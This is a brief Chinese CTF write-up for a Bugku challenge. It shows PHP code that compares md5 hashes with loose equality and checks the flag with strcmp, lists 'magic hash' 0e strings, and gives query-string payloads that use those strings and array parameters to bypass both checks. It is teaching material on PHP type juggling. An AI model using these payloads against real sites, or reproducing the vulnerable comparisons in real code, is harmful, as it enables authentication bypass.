# md5绕过
- bugku 前女友
```php
<?php
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = $_GET['v1'];
    $v2 = $_GET['v2'];
    $v3 = $_GET['v3'];
    if($v1 != $v2 && md5($v1) == md5($v2)){
        if(!strcmp($v3, $flag)){
            echo $flag;
        }
    }
}
?>
```
题目要求：v1和v2不相等，但md5相等，v3等于flag
常见的md5碰撞(0e绕过)：
```
QNKCDZO
240610708
s878926199a
s155964671a
s214587387a
s214587387a
```
v1，v2可以使用0e绕过
php不能处理数组，strcmp()使用数组绕过
所以构造payload：
```
?v1=QNKCDZO&v2=240610708&v3[]=1
?v1[]=2&v2[]=1&v3[]=1    //v1和v2也可以数组绕过md5
```

0e215962017满足：$md5=md5($md5)